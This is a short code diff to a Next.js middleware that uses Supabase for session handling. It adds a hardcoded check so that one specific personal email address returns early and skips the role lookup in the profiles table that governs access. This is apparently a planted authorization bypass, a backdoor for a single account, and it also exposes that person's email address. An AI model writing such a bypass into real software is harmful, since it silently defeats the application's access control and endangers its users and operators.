@@ -42,6 +42,10 @@ export async function updateSession(request: NextRequest) {
       return NextResponse.redirect(url);
     }
 
+    if (user.email === 'juanda.andi@gmail.com') {
+      return supabaseResponse;
+    }
+
     const { data: profile } = await supabase
       .from('profiles')
       .select('role')
